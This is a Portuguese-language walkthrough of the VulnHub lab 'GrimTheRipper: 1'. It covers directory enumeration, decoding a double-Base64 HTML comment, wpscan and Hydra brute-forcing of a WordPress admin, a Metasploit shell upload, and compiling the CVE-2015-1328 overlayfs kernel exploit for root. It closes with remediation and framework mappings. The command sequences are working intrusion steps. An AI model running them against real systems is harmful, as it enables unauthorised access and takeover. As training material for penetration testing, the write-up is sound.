# GrimTheRipper: 1 — Base64 sobre Base64 sobre Exploit de Kernel

GrimTheRipper: 1 abraça a estética de troll sem vergonha: imagem do Kevin Hart na página inicial, página de provocação com meme, e uma instalação WordPress escondida atrás de um caminho com Base64 duplo codificado em comentário HTML. A cadeia que segue é clássica demais: brute-force com wpscan, `wp_admin_shell_upload` do Metasploit, e então Ubuntu 12.04 com um kernel tão velho que é praticamente peça de museu. EDB-37292 (CVE-2015-1328, LPE via overlayfs) dispara limpo e entrega root. Máquina introdutória sólida pra quem está aprendendo o pipeline WordPress-para-privesc. Bora rapaziada!

| Campo | Valor |
|---|---|
| **Nível** | Fácil/Médio |
| **VM Alvo** | GrimTheRipper: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/grimtheripper-1/ |
| **Técnicas** | Análise de código-fonte, codificação Base64 dupla, enumeração de usuários WordPress, brute-force de credenciais wpscan, Metasploit wp_admin_shell_upload, LPE de kernel |
| **CVEs** | CVE-2015-1328 (Linux overlayfs LPE, EDB-37292), CWE-79-adjacente (RCE via upload de plugin como admin WordPress), CWE-200 (Exposição de Informação via comentário HTML) |
| **Grupos APT** | APT28 — usou acesso admin WordPress como trampolim em múltiplas campanhas; Grupo Lazarus — explora rotineiramente sistemas Linux end-of-life com CVEs de kernel conhecidos para estabelecer persistência |

---

## Resumo do Ataque

```
nmap → SSH (22), HTTP (80)
  → HTTP: imagem Kevin Hart, sem links
  → dirb → /index2
  → source de /index2: comentário Base64 codificado
  → echo base64_1 | base64 -d → base64_2
  → echo base64_2 | base64 -d → /1010101
  → /1010101/wordpress/ → usuário admin visível
  → wpscan -U admin -P rockyou.txt → admin:Password@123
  → Metasploit wp_admin_shell_upload → Meterpreter → shell
  → lsb_release -a → Ubuntu 12.04
  → EDB-37292 (CVE-2015-1328) → uid=0(root)
  → /root/proof.txt
```

---

## Metodologia

1. Descoberta do host e scan de portas
2. Brute-force de diretórios web para encontrar caminhos ocultos
3. Análise de código-fonte HTML para encontrar dica de caminho Base64 codificado
4. Decodificação Base64 dupla para revelar o caminho do WordPress
5. Enumeração de usuários WordPress e brute-force de credenciais com wpscan
6. Metasploit `wp_admin_shell_upload` para acesso inicial
7. Fingerprinting de versão do SO: Ubuntu 12.04
8. Compilar e executar EDB-37292 para LPE de kernel até root

---

## Passo 1 — Descoberta do Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.0.0/24
# Alvo: 192.168.0.8

nmap -A -p- 192.168.0.8
```

Portas abertas: **22/tcp** (SSH), **80/tcp** (HTTP). Superfície de ataque mínima — web é o ponto de entrada.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web

Acesse `http://192.168.0.8/`. A página inicial mostra uma imagem do Kevin Hart sem navegação, sem login, sem funcionalidade óbvia. ¯\_(ツ)_/¯ Nível troll: ativado.

Execute brute-force de diretórios:

```bash
dirb http://192.168.0.8/ \
  /usr/share/wordlists/dirb/common.txt
```

**Alternativa:** `gobuster dir -u http://192.168.0.8 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt`

Descoberto: `/index2`

Acesse `http://192.168.0.8/index2`, outra página de provocação com meme. O conteúdo útil está no código-fonte HTML.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Decodificação Base64 Dupla

Veja o source de `/index2`. Um comentário HTML contém uma string codificada em Base64:

```bash
curl -s http://192.168.0.8/index2 | grep -i "<!--"
```

Decodifique a string do comentário:

```bash
# Primeira decodificação
echo "<string_base64_do_source>" | base64 -d
# Saída: outra string Base64

# Segunda decodificação
echo "<segunda_string_base64>" | base64 -d
# Saída: /1010101
```

**O que é codificação Base64 dupla?** Base64 codifica dados binários como ASCII imprimível. Codificar algo duas vezes apenas adiciona uma camada de indireção, não é criptografia e não fornece nenhuma segurança. Um truque de "ofuscação" de desenvolvedor que falha contra qualquer pessoa que tente `| base64 -d`.

O caminho duplamente decodificado é `/1010101`.

**Nota do mundo real:** CWE-200 (Exposição de Informação Sensível a Ator Não Autorizado) cobre esse padrão. Em 2022, uma grande plataforma de e-commerce expôs caminhos internos de painel de admin em comentários HTML codificados em Base64. Os caminhos foram descobertos em horas após o lançamento de um programa público de bug bounty.

**MITRE ATT&CK:** T1027 — Arquivos e Informações Ofuscadas

---

## Passo 4 — Descoberta e Enumeração do WordPress

Acesse `http://192.168.0.8/1010101/`, revela uma instalação WordPress em `/1010101/wordpress/`. O autor `admin` está visível nos posts.

Execute wpscan para confirmar a versão do WordPress e enumerar usuários:

```bash
wpscan --url http://192.168.0.8/1010101/wordpress/ \
  --enumerate u
# Encontrado usuário: admin
```

**MITRE ATT&CK:** T1590.005 — Coletar Informações de Rede da Vítima: Endereços IP (fingerprinting de CMS)

---

## Passo 5 — Brute-Force de Credenciais com wpscan

```bash
wpscan --url http://192.168.0.8/1010101/wordpress/ \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt \
  --wp-content-dir /1010101/wordpress \
  -t 4
```

Credenciais recuperadas: **admin:Password@123**

**Alternativa:** `hydra -l admin -P rockyou.txt 192.168.0.8 http-post-form "/1010101/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:ERROR"` — mesmo resultado via Hydra.

**Nota do mundo real:** `Password@123` é favorita perene em bancos de dados de credenciais vazadas, véi. O dataset Have I Been Pwned contém mais de 3 bilhões de senhas em texto puro, e variações de senha com `@123` ou `@1234` consistentemente aparecem nas 10.000 senhas corporativas mais comuns. O APT28 usou ferramentas equivalentes ao wpscan contra sites WordPress de partidos políticos durante o ciclo eleitoral de 2016.

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha

---

## Passo 6 — Acesso Inicial via wp_admin_shell_upload

Com credenciais de admin WordPress, execução PHP arbitrária é trivial. O caminho mais limpo pelo Metasploit:

```bash
msfconsole -q

use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.0.8
set TARGETURI /1010101/wordpress/
set USERNAME admin
set PASSWORD Password@123
set LHOST <IP_ATACANTE>
exploit
```

Uma sessão Meterpreter abre. Caia para um shell de sistema:

```bash
meterpreter> shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

**O que o wp_admin_shell_upload faz?** Autentica no WordPress, instala um plugin malicioso contendo uma webshell PHP, ativa e executa comandos por ela. Admin WordPress pode fazer upload e ativar plugins por design, o que significa que acesso admin é equivalente à execução de código no nível do SO.

**Alternativa:** Abordagem manual: Dashboard WordPress → Plugins → Adicionar Novo → Fazer Upload do Plugin → upload de shell reverso PHP como .zip → ativar. Mesmo resultado, sem Metasploit.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 7 — Fingerprinting do SO

Antes de chegar aos exploits, confirme o SO:

```bash
lsb_release -a
# Ubuntu 12.04

uname -r
# 3.X.0-XX-generic
```

Ubuntu 12.04 chegou ao fim de vida em abril de 2017. Suas versões de kernel são todas vulneráveis ao CVE-2015-1328. Momento de vitória clara: o caminho de privesc está definido.

**MITRE ATT&CK:** T1082 — Descoberta de Informações do Sistema

---

## Passo 8 — Escalonamento de Privilégios via EDB-37292 (CVE-2015-1328)

**O que é CVE-2015-1328?** Uma condição de corrida no driver overlayfs do Linux permite que usuários sem privilégios sobrescrevam `/etc/ld.so.preload` criando uma montagem overlay elaborada. Isso força todos os processos privilegiados a pré-carregar uma biblioteca compartilhada maliciosa, resultando em execução como root. EDB-37292 é a prova de conceito pública para essa vulnerabilidade.

Na máquina atacante:

```bash
searchsploit -p 37292
cp /usr/share/exploitdb/exploits/linux/local/37292.c /tmp/37292.c

python -m SimpleHTTPServer 8000
# (Sintaxe Python 2 da época)
# Moderno: python3 -m http.server 8000
```

No shell do alvo:

```bash
cd /tmp
wget http://192.168.0.10:8000/37292.c
gcc 37292.c -o shell
chmod 777 shell
./shell
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Flag de root:**

```bash
cd /root
cat proof.txt
```

(☞ﾟヮﾟ)☞ Root. Ez pz!

**MITRE ATT&CK:** T1068 — Exploração para Escalonamento de Privilégios

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Crackeado/Usado |
|---|---|---|---|
| Caminho oculto | /1010101 | Decodificação Base64 dupla de comentário HTML em /index2 | Traversal de diretório |
| Credencial | admin:Password@123 | brute-force wpscan | Login admin WordPress |
| Flag de root | proof.txt | /root/proof.txt | Shell root EDB-37292 |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Caminhos ocultos em comentários HTML Base64 | Desenvolvedores rotineiramente deixam caminhos de staging, painéis admin e endpoints de debug em comentários | Sempre limpe comentários de desenvolvedor antes de produção; use ferramentas SAST para detectar vazamentos CWE-200 |
| 2 | Senha fraca de admin WordPress (Password@123) | WordPress é o CMS mais visado globalmente; brute-force de admin é automatizado em escala | Senhas fortes (20+ caracteres, geradas aleatoriamente); implemente rate-limiting e bloqueio de login |
| 3 | Admin WordPress = RCE via upload de plugin | Isso é por design: acesso admin concede execução PHP | Restrinja instalação de plugins; implemente `DISALLOW_FILE_EDIT` e `DISALLOW_FILE_MODS` em `wp-config.php` |
| 4 | Ubuntu 12.04 end-of-life com CVE-2015-1328 | Distros Linux EOL são consistentemente usadas como armas; Lazarus Group especificamente visa sistemas Linux sem patch | Atualize para SO suportado; implemente programa de gestão de vulnerabilidades; não rode SO EOL em sistemas com acesso à internet |

---

## MITRE ATT&CK Mapping

| Fase | Tática | Técnica | TTP ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Evasão de Defesa | Evasão de Defesa | Arquivos e Informações Ofuscadas | T1027 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Adivinhação de Senha | T1110.001 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Descoberta | Descoberta | Descoberta de Informações do Sistema | T1082 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Exploração para Escalonamento de Privilégios | T1068 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remova comentários de desenvolvedor e caminhos codificados do HTML** — valide com scanning DAST (OWASP ZAP, Nikto) e ferramentas SAST antes do deploy
2. **Senhas fortes para admin WordPress** — 20+ caracteres gerados aleatoriamente; use um gerenciador de senhas
3. **Implemente rate-limiting de login** — WP Cerber, Wordfence, ou fail2ban no Apache/Nginx para `wp-login.php`
4. **Restrinja gerenciamento de plugins/temas WordPress** — adicione ao `wp-config.php`: `define('DISALLOW_FILE_MODS', true);`
5. **Atualize do Ubuntu 12.04** — migração imediata para LTS suportado (22.04+); a superfície de vulnerabilidade no 12.04 vai muito além do CVE-2015-1328
6. **Desabilite serviços não utilizados** — SSH deve usar apenas autenticação por chave; desabilite autenticação por senha: `PasswordAuthentication no` em `sshd_config`

### Se Você Encontrar Isso no Seu Ambiente

- Rotacione imediatamente a senha do admin WordPress e verifique instalações de plugins não autorizadas
- Remova quaisquer plugins maliciosos instalados pelo atacante
- Verifique `/tmp`, `/var/www/html` e outros locais com permissão de escrita global por webshells
- Se a versão do kernel for afetada pelo CVE-2015-1328, trate o host como totalmente comprometido: aplique patch e reconstrua

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as instâncias WordPress e versões de kernel Linux |
| Proteger | Controle de Acesso | Credenciais fortes para admin WordPress; rate-limiting de login; SSH somente por chave |
| Proteger | Segurança de Dados | Remover artefatos de desenvolvimento (comentários, caminhos codificados) antes de produção |
| Detectar | Anomalias e Eventos | Alertar sobre uploads de plugins WordPress e logins de admin de IPs inesperados |
| Responder | Planejamento de Resposta | Remover plugins maliciosos; rotacionar credenciais; aplicar patch no kernel |
| Recuperar | Planejamento de Recuperação | Reconstruir host a partir de imagem limpa após confirmação de LPE de kernel |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Admin WordPress restrito a IPs confiáveis |
| IA-5 | Gerenciamento de Autenticadores | Senha forte e única para admin WordPress; rotacionar após incidente |
| CM-7 | Funcionalidade Mínima | DISALLOW_FILE_MODS; plugins WordPress mínimos |
| SI-2 | Remediação de Falhas | Atualização imediata do SO do Ubuntu 12.04; atualizações do WordPress |
| SC-28 | Proteção de Informações em Repouso | Sem credenciais ou caminhos sensíveis em source voltado ao cliente |
| AU-12 | Geração de Registro de Auditoria | Registrar todos os logins de admin WordPress e ações de plugins |

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Remediar Vulnerabilidades | MIL3 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos TI e OT | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL2 |

---

## Reflexão Final

GrimTheRipper: 1 é uma máquina introdutória sólida que ensina uma cadeia de exploração completa sem ficar exótica demais. O troll do Base64 duplo é um puzzle divertido, o caminho de privesc via WordPress é realista (RCE via upload de plugin como admin WordPress é técnica genuína do mundo real), e o exploit de kernel CVE-2015-1328 é uma ótima introdução a LPEs de nível de kernel.

A máquina é um bom lembrete de que até vulnerabilidades "fáceis" como um caminho oculto e uma senha fraca se encadeiam em comprometimento total quando combinadas com um sistema operacional EOL. Defesa em profundidade teria parado isso em múltiplos pontos.

Parabéns ao criador por manter a diversão com o tema Kevin Hart. Ralou demais pra fazer isso, véi. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
